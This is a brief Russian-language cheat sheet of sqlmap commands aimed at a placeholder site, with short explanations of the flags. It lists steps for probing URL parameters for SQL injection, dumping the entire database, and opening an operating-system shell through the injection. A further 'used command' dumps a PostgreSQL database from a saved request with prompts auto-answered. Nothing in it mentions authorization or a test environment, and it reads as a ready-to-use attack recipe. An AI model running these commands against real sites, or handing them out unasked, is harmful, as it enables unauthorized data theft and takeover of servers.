# 1. Быстрая проверка сайта
python3 sqlmap.py -u "https://site.com/page?id=1"

# 2. Полный анализ параметра
python3 sqlmap.py -u "https://site.com/search?q=test" -p q --level=5

# 3. Дамп всей базы данных
python3 sqlmap.py -u "https://site.com/page?id=1" --dump-all

# 4. Получение shell (командной строки)
python3 sqlmap.py -u "https://site.com/page?id=1" --os-shell

# Использованная команда:
python3 sqlmap.py -r request.txt --dbms=PostgreSQL --batch --dump


Что каждый параметр значит:

    -r request.txt - взять запрос из файла

    --dbms=PostgreSQL - уточняем СУБД (ускоряет работу)

    --batch - автоматически отвечать "да" на все вопросы

    --dump - извлечь все данные из таблиц
